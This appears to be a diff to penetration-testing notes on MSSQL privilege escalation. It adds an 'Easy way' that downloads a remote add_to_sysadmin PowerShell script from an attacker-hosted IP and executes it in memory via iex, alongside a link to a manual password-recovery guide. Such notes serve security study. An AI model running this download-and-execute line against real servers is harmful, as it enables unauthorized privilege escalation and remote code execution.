@@ -258,6 +258,15 @@ select IS_SRVROLEMEMBER ('sysadmin')
 
 <summary>Adding Local Admin Account to MSSQL Server</summary>
 
+### Easy way
+
+```bash
+# https://raw.githubusercontent.com/n000b3r/PrivEsc/refs/heads/main/Windows/add_to_sysadmin/add_to_sysadmin.ps1
+iex (new-object net.webclient).downloadstring('http://192.168.45.214/add_to_sysadmin.ps1')
+```
+
+### Manual GUI Way
+
 Follow guide [here](https://hex64.net/blog/how-to-recover-sa-password-on-microsoft-sql-server/)
 
 1. Go to Sql Server Configuration Manager
